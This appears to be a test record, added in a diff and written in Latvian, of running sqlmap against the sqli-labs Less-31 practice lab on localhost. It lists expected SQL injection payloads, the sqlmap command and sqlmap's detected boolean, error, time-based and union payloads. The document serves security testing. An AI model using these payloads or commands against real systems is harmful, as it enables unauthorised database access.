@@ -1,0 +1,38 @@
+=================================================================================
+1. Īpašība: piemēra sqli-labs12 variācija, tikai šeit kļūdas gadījumā ziņojums parādās tur pat, kur rezultāts
+2. Nepiciešams tampering: nē
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?id=-1") OR ("1"="1
+3.2. error-based: ?id=-1")
+3.3. time-based: ?id=-1") or sleep(1)-- -
+3.4. union: ?id=-1") union select 1,2,3-- -
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 1275193 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://localhost/sqli-labs/sqli-labs/Less-31/?id=1" -p id -risk=3 --level=5
+
+7. Jautājumi, kurus uzdeva SQLMap:
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+=================================================================================
+sqlmap identified the following injection point(s) with a total of 89 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1") AND 1601=1601 AND ("QWmg"="QWmg
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=1") AND GTID_SUBSET(CONCAT(0x717a786b71,(SELECT (ELT(3736=3736,1))),0x7176706b71),3736) AND ("agQi"="agQi
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1") AND (SELECT 2735 FROM (SELECT(SLEEP(5)))vJlr) AND ("Icfz"="Icfz
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-6476") UNION ALL SELECT NULL,NULL,CONCAT(0x717a786b71,0x4e574f75414c50487a45724c456c555175657a7552546959584d58647348736748704a7872566261,0x7176706b71)-- -
+---
+web application technology: PHP 5.6.40, Apache 2.4.38
+back-end DBMS: MySQL >= 5.6
